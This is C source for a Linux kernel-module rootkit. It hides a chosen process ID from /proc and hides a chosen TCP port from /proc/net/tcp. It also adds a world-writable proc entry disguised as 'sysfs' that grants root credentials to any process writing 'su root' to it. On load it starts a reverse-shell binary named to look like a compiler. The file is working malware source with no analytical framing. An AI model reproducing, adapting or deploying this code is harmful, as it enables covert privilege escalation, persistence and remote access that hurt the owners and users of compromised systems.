#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <net/sock.h>
#include <linux/file.h>
#include <linux/stat.h>
#include <linux/proc_fs.h>
#include <asm/unistd.h>
#include <net/tcp.h>

/* pid to hide */
int HIDEPID = -1;
/*hide port*/
int HIDEPORT = -1;

static int len, temp;
static char *msg;
/* proc entry to put command */
#define HIDEPROCNAME "sysfs"
/* reverse back shell*/
#define SHELL "/usr/bin/x86_64-redhat-linux-cpp"
/* clean up script */
#define CLEANUP "/usr/bin/ls"
/* seq_show length */
#define TMPSZ 150
/* port hide entry */
#define NET_ENTRY "/proc/net/tcp"
/* defined structure */
#define SEQ_AFINFO_STRUCT struct tcp_seq_afinfo

#define fm_printk(level, fmt, ...)                                      \
    printk(level "%s.%s: " fmt, THIS_MODULE->name, __func__, ##__VA_ARGS__)
#define fm_alert(fmt, ...)                      \
    fm_printk(KERN_ALERT, fmt, ##__VA_ARGS__)

typedef int (*readdir_t)(struct file *, void *, filldir_t);

static readdir_t orig_proc_readdir=NULL;

static int (*real_seq_show)(struct seq_file * seq, void *v);

static filldir_t proc_filldir = NULL;
/*Convert string to integer. Strip non-integer characters. Courtesy
  adore-ng*/
static int adore_atoi(const char *str) {
    int ret = 0, mul = 1;
    const char *ptr;
    for (ptr = str; *ptr >= '0' && *ptr <= '9'; ptr++)
        ;
    ptr--;
    while (ptr >= str) {
        if (*ptr < '0' || *ptr > '9')
            return -1;
        ret += (*ptr - '0') * mul;
        mul *= 10;
        ptr--;
    }

    return ret;
}
// typedef int (*filldir_t)(void *, const char *, int, loff_t, u64, unsigned);
static int my_proc_filldir(void *buf, const char *name, int nlen, loff_t off, u64 ino, unsigned x) {
    /*If name is equal to our pid, then we return 0. This way,
      our pid isn't visible*/
    if ((HIDEPID >= 0) && (adore_atoi(name) == HIDEPID)) {
#ifdef DEBUG
        fm_alert("I am hiding process %d", HIDEPID);
#endif
        return 0;
    }
    /*Otherwise, call original filldir*/
    return proc_filldir(buf, name, nlen, off, ino, x);
}

static int my_proc_readdir(struct file *fp, void *buf, filldir_t filldir) {
    int r = 0;
    proc_filldir = filldir;
    /*invoke orig_proc_readdir with my_proc_filldir*/
    r = orig_proc_readdir(fp, buf, my_proc_filldir);
    return r;
}

static int hide_pid(readdir_t *orig_readdir, readdir_t new_readdir) {
    struct file *filep;
    struct file_operations * f_op;

    /*open /proc */
    if((filep = filp_open("/proc",O_RDONLY,0))==NULL) {
        return -1;
    }
    /*store proc's readdir*/
    if(orig_readdir)
        *orig_readdir = filep->f_op->readdir;
    /*set proc's readdir to new_readdir*/
    f_op = (struct file_operations *)filep->f_op;
    f_op->readdir = new_readdir;
    filep->f_op = f_op;
    filp_close(filep,0);

    return 0;
}

/*restore /proc's readdir*/
static int restore (readdir_t orig_readdir) {
    struct file *filep;
    struct file_operations * f_op;
    /*open /proc */
    if ((filep = filp_open("/proc", O_RDONLY, 0)) == NULL) {
        return -1;
    }
    f_op = (struct file_operations *)filep->f_op;
    f_op->readdir = orig_readdir;
    /*restore /proc's readdir*/
    filep->f_op = f_op;
    filp_close(filep, 0);
    return 0;
}

static ssize_t read_proc(struct file *filp, char *buf, size_t count, loff_t *offp) {
    int retval;
    if(count > temp) {
        count = temp;
    }
    temp = temp - count;
    retval = copy_to_user(buf, msg, count);
    if(count == 0)
        temp = len;
return count;
}

static ssize_t write_proc(struct file *filp, const char *buf, size_t count, loff_t *offp) {
    struct cred * cred;
    int retval;
    retval = copy_from_user(msg, buf, count);
    len = count;
    temp = len;
    if (strncmp(buf,"su root", 7) == 0) {
        cred = (struct cred * )__task_cred(current);
        cred-> uid.val = 0;
        cred-> gid.val = 0;
        cred-> suid.val = 0;
        cred-> euid.val = 0;
        cred-> egid.val = 0;
        cred-> fsuid.val = 0;
        cred-> fsgid.val = 0;
#ifdef DEBUG
        fm_alert("now you are root");
#endif
    } else if (strncmp(buf, "hideport", 8) == 0) {
        HIDEPORT  = adore_atoi(buf + 9);
#ifdef DEBUG
        fm_alert("Hide port %d", HIDEPORT);
#endif
    } else if (strncmp(buf,"hidepid", 7) == 0) {
        HIDEPID = adore_atoi(buf + 8);
#ifdef DEBUG
        fm_alert("Hide pid %d", HIDEPID);
#endif
    } else if (strncmp(buf,"clean", 5) == 0) {
        HIDEPID = -1;
        HIDEPORT = -1;
#ifdef DEBUG
        fm_alert("clean");
#endif
    }
    return count;
}

struct file_operations proc_fops = {
    read:read_proc,
    write:write_proc
};

static void create_new_proc_entry(char *proc_name) {
    proc_create(proc_name, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH, NULL, &proc_fops);
    msg = kmalloc(GFP_KERNEL, 10 * sizeof(char));
}


static int start_listener(void) {
    char *argv[] = {SHELL, NULL};
    static char *env[] = {
        "HOME=/",
        "TERM=linux",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
        NULL
    };
    return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
}

static int kill_listener(void) {
    char *argv[] = {CLEANUP, NULL, NULL};
    static char *env[] = {
        "HOME=/",
        "TERM=linux",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
        NULL
    };
    return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
}

#ifdef DEBUG
#define set_afinfo_seq_op(op, path, afinfo_struct, new, old)    \
    do {                                                        \
    struct file *filp;                                          \
    afinfo_struct *afinfo;                                      \
                                                                \
    filp = filp_open(path, O_RDONLY, 0);                        \
    if (IS_ERR(filp)) {                                         \
        fm_alert("Failed to open %s with error %ld.\n",         \
                 path, PTR_ERR(filp));                          \
        old = NULL;                                             \
    } else {                                                    \
                                                                \
        afinfo = PDE_DATA(filp->f_path.dentry->d_inode);        \
        old = afinfo->seq_ops.op;                               \
        fm_alert("Setting seq_op->" #op " from %p to %p.",      \
                 old, new);                                     \
        afinfo->seq_ops.op = new;                               \
                                                                \
        filp_close(filp, 0);                                    \
    }                                                           \
    } while (0)
#else
#define set_afinfo_seq_op(op, path, afinfo_struct, new, old)    \
    do {                                                        \
    struct file *filp;                                          \
    afinfo_struct *afinfo;                                      \
                                                                \
    filp = filp_open(path, O_RDONLY, 0);                        \
    if (IS_ERR(filp)) {                                         \
        old = NULL;                                             \
    } else {                                                    \
                                                                \
        afinfo = PDE_DATA(filp->f_path.dentry->d_inode);        \
        old = afinfo->seq_ops.op;                               \
        afinfo->seq_ops.op = new;                               \
                                                                \
        filp_close(filp, 0);                                    \
    }                                                           \
    } while (0)
#endif

char *strnstr(const char *haystack, const char *needle, size_t n) {
    char *s = strstr(haystack, needle);
    if (s == NULL)
        return NULL;
    if (s-haystack+strlen(needle) <= n)
        return s;
    else
        return NULL;
}

static int fake_seq_show(struct seq_file *seq, void *v) {
    int retval = real_seq_show(seq, v);

    char port[12];
    if (HIDEPORT < 0)
        return retval;
    snprintf(port, 12, "%04X", HIDEPORT);
#ifdef DEBUG
    fm_alert("I am hiding %d", HIDEPORT);
#endif
    if(strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ)) {
        seq->count -= TMPSZ;
    }
    return retval;
}

static int __init myinit(void) {
    hide_pid(&orig_proc_readdir, my_proc_readdir);
    create_new_proc_entry(HIDEPROCNAME);
    set_afinfo_seq_op(show, NET_ENTRY, SEQ_AFINFO_STRUCT, fake_seq_show, real_seq_show);
    start_listener();
    return 0;
}

static void myexit(void) {
    restore(orig_proc_readdir);
    remove_proc_entry(HIDEPROCNAME, NULL);
    if (real_seq_show) {
        void *dummy;
        set_afinfo_seq_op(show, NET_ENTRY, SEQ_AFINFO_STRUCT, real_seq_show, dummy);
    }
    kill_listener();
    kfree(msg);
}

module_init(myinit);
module_exit(myexit);

MODULE_LICENSE("GPL");
